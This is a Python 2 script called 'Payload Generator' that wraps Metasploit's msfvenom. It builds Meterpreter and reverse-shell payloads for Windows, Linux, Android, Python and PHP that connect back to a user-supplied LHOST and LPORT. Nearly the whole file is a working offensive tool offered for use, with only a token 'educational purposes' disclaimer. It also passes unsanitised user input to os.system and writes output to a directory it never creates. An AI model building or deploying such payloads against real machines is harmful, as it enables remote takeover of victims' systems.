#!/usr/bin/python
#-*- coding: utf-8 -*-
################################################################################
#                                                                              #
#                                   PG                                         #
#                           Payload Generaror                                  #
#                             by: Armand Kruger                                #
#                                                                              #
# NEC : Cyber Security                                                         #
#                                                                              #
#                                                                              #
#                                                                              #
#                                                                              #
#                                                                              #
#                                 LICENSE                                      #
# THIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND. YOU MAY USE  #
# THIS SOFTWARE AT YOUR OWN RISK. The use of this software Simple Payload      #
# Generator(SPG) is COMPLETE RESPONSIBILITY of the END-USER. Developers assume #
#  NO liability and are NOT responsible for any misuse or damage caused by     #
# this program.                                                                #
#                                                                              #
# IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY     #
# DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES   #
# (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; #
# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND  #
# ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT   #
# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF     #
# THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE             #
#                                                                              #
################################################################################

import os
from sys import exit
from time import sleep

red= '\033[91m'
orange= '\33[38;5;208m'
green= '\033[92m'
cyan= '\033[36m'
bold= '\033[1m'
end= '\033[0m'

def head():
    os.system('clear')
    print'''{0}



 |   |  .\ :                    |  | :     ,---.                 ,---.'|        |   :     :                ,---,             __  ,-.            |  | :,'   ,---.    __  ,-. 
 .   :  |: |                    :  : '    '   ,'\                |   | :        .   |  ;. /            ,-+-. /  |          ,' ,'/ /|            :  : ' :  '   ,'\ ,' ,'/ /| 
 |   |   \ : ,--.--.        .--,|  ' |   /   /   |  ,--.--.      |   | |        .   ; /--`     ,---.  ,--.'|'   |   ,---.  '  | |' | ,--.--.  .;__,'  /  /   /   |'  | |' | 
 |   : .   //       \     /_ ./|'  | |  .   ; ,. : /       \   ,--.__| |        ;   | ;  __   /     \|   |  ,"' |  /     \ |  |   ,'/       \ |  |   |  .   ; ,. :|  |   ,' 
 ;   | |`-'.--.  .-. | , ' , ' :|  | :  '   | |: :.--.  .-. | /   ,'   |        |   : |.' .' /    /  |   | /  | | /    /  |'  :  / .--.  .-. |:__,'| :  '   | |: :'  :  /   
 |   | ;    \__\/: . ./___/ \: |'  : |__'   | .; : \__\/: . ..   '  /  |        .   | '_.' :.    ' / |   | |  | |.    ' / ||  | '   \__\/: . .  '  : |__'   | .; :|  | '    
 :   ' |    ," .--.; | .  \  ' ||  | '.'|   :    | ," .--.; |'   ; |:  |        '   ; : \  |'   ;   /|   | |  |/ '   ;   /|;  : |   ," .--.; |  |  | '.'|   :    |;  : |    
 :   : :   /  /  ,.  |  \  ;   :;  :    ;\   \  / /  /  ,.  ||   | '/  '        '   | '/  .''   |  / |   | |--'  '   |  / ||  , ;  /  /  ,.  |  ;  :    ;\   \  / |  , ;    
 |   | :  ;  :   .'   \  \  \  ;|  ,   /  `----' ;  :   .'   \   :    :|        |   :    /  |   :    |   |/      |   :    | ---'  ;  :   .'   \ |  ,   /  `----'   ---'     
 `---'.|  |  ,     .-./   :  \  \---`-'          |  ,     .-./\   \  /           \   \ .'    \   \  /'---'        \   \  /        |  ,     .-./  ---`-'                     
   `---`   `--`---'        \  ' ;                 `--`---'     `----'             `---`       `----'               `----'          `--`---'                                 
                              `--`                                                                                                                                            
                                                                                                                             
|====( Payload Generator)====|{3}
Developed By: Armand Kruger




'''.format(orange, green, bold, end, cyan)

def disclaimer():
    print('This tool was developed for learning purposes only and the use is complete responsibility of the end-user. Do you accept to cause no harm to any machine and use this tool for educational purposes only ? {0}(yes/no){1}').format(bold, end)
    if raw_input("\n{0}{1}PG:~#{2} ".format(green, bold, end)) == 'yes':
        print('{0}Launching Generator....{1}').format(orange, end)
        sleep(1)
    else:
        print('{0}Please Accept before you Attempt to use this Tool.{1}').format(red, end)
        exit(0)

def finish():
    head()
    print('{0}Shutting Down System...{1}').format(orange, end)
    exit(0)

def present():
    if os.path.isfile('/usr/bin/msfvenom') == False:
        print('{0}Failed to locate msfvenom. Make sure Metasploit-Framework is installed correctly and try again.{1}').format(red, end)
        exit(0)
    if os.path.isdir('Payloads') == False:
        head()
        print('{0}Creating Payload Directory{1}').format(orange, end)
        os.makedirs('Payloads')
        sleep(1)

def main(platform, type):
    lhost = raw_input("\nEnter LHOST (Your Local IP Address)\n{0}{1}PG:~/LHOST#{2} ".format(green, bold, end))
    lport = raw_input("\nEnter LPORT (The Local Listening Port Ex: 4444) \n{0}{1}PG:~/LPORT#{2} ".format(green, bold, end))
    output = raw_input("\nEnter Payload Name (Ex: Expliot)\n{0}{1}PG:~/Payloads#{2} ".format(green, bold, end))
    #Windows
    if platform == 'Windows' and type == '1':
        payload= 'windows/meterpreter/reverse_http'
        format= 'exe'
        extension= '.exe'
    if platform == 'Windows' and type == '2':
        payload= 'windows/meterpreter/reverse_https'
        format= 'exe'
        extension= '.exe'
    if platform == 'Windows' and type == '3':
        payload= 'windows/meterpreter/reverse_tcp'
        format= 'exe'
        extension= '.exe'
    #linux
    if platform == 'Linux' and type == '1':
        payload= 'linux/x86/shell/reverse_tcp'
        format= 'elf'
        extension= '.elf'
    if platform == 'Linux' and type == '2':
        payload= 'linux/x86/meterpreter/reverse_tcp'
        format= 'elf'
        extension= '.elf'
    #Android
    elif platform == 'Android' and type == '1':
        payload= 'android/meterpreter/reverse_http'
        format= 'raw'
        extension= '.apk'
    elif platform == 'Android' and type == '2':
        payload= 'android/meterpreter/reverse_https'
        format= 'raw'
        extension= '.apk'
    elif platform == 'Android' and type == '3':
        payload= 'android/meterpreter/reverse_tcp'
        format= 'raw'
        extension= '.apk'
    #Python
    elif platform == 'Python' and type == '1':
        payload= 'python/meterpreter/reverse_http'
        format= 'raw'
        extension= '.py'
    elif platform == 'Python' and type == '2':
        payload= 'python/meterpreter/reverse_https'
        format= 'raw'
        extension= '.py'
    elif platform == 'Python' and type == '3':
        payload= 'python/meterpreter/reverse_tcp'
        format= 'raw'
        extension= '.py'
    #PHP
    elif platform == 'PHP' and type == '1':
        payload= 'php/meterpreter/reverse_tcp'
        format= 'raw'
        extension= '.php'
    os.system('msfvenom -p '+payload+' LHOST='+lhost+' LPORT='+lport+' -f'+format+' -o output/'+output+extension)
    sleep(3)
    if os.path.isfile('output/'+output+extension) == False:
        head()
        raw_input('Oops , Something Went Wrong {0}(Hit Enter to continue){1}'.format(bold, end))
        choosepayload()
    else:
        head()
        raw_input('Payload Build is Complete {0}(Hit Enter to continue){1}'.format(bold, end))
        choosepayload()

def choosepayload():
    head()
    select = raw_input('{2}Select the Payload Type:{1}\n\n{0}[{1}1{0}]{1} Windows\n{0}[{1}2{0}]{1} Linux\n{0}[{1}3{0}]{1} Android\n{0}[{1}4{0}]{1} Python\n{0}[{1}5{0}]{1} PHP\n{0}[{1}0{0}]{1} Exit\n\n{0}{2}PG:~#{1} '.format(green, end, bold))
    if select == '1':
        head()
        type = raw_input('{2}Select the Payload Type:{1}\n\n{0}[{1}1{0}]{1} windows/meterpreter/reverse_http\n{0}[{1}2{0}]{1} windows/meterpreter/reverse_https\n{0}[{1}3{0}]{1} windows/meterpreter/reverse_tcp\n{0}[{1}0{0}]{1} Main Menu\n\n{0}{2}PG:~/Windows#{1} '.format(green, end, bold))
        if type == '0':
            choosepayload()
        main('Windows', type)
    elif select == '2':
        head()
        type = raw_input('{2}Select the Payload Type:{1}\n\n{0}[{1}1{0}]{1} linux/x86/shell/reverse_tcp\n{0}[{1}2{0}]{1} linux/x86/meterpreter/reverse_tcp\n{0}[{1}0{0}]{1} Main Menu\n\n{0}{2}PG:~/Linux#{1} '.format(green, end, bold))
        if type == '0':
            choosepayload()
        main('Linux', type)
    elif select == '3':
        head()
        type = raw_input('{2}select the Payload Type:{1}\n\n{0}[{1}1{0}]{1} android/meterpreter/reverse_http\n{0}[{1}2{0}]{1} android/meterpreter/reverse_https\n{0}[{1}3{0}]{1} android/meterpreter/reverse_tcp\n{0}[{1}0{0}]{1} Main Menu\n\n{0}{2}PG:~/Android#{1} '.format(green, end, bold))
        if type == '0':
            choosepayload()
        main('Android', type)
    elif select == '4':
        head()
        type = raw_input('{2}Select the Payload Type:{1}\n\n{0}[{1}1{0}]{1} python/meterpreter/reverse_http\n{0}[{1}2{0}]{1} python/meterpreter/reverse_https\n{0}[{1}3{0}]{1} python/meterpreter/reverse_tcp\n{0}[{1}0{0}]{1} Main Menu\n\n{0}{2}PG:~/Python#{1} '.format(green, end, bold))
        if type == '0':
            choosepayload()
        main('Python', type)
    elif select == '5':
        head()
        type = raw_input('{2}Select the Payload Type:{1}\n\n{0}[{1}1{0}]{1} php/meterprter/reverse_tcp\n{0}[{1}0{0}]{1} Main Menu\n\n{0}{2}PG:~/PHP#{1} '.format(green, end, bold))
        if type == '0':
            choosepayload()
        main('PHP', type)
    elif select == '0':
        finish()
    else:
        head()
        print('{0}Please Select the Right Option, Thanx.{1}').format(red, end)
        sleep(2)
        choosepayload()

if __name__ == "__main__":
    try:
        head()
        disclaimer()
        present()
        choosepayload()
    except KeyboardInterrupt:
        finish()
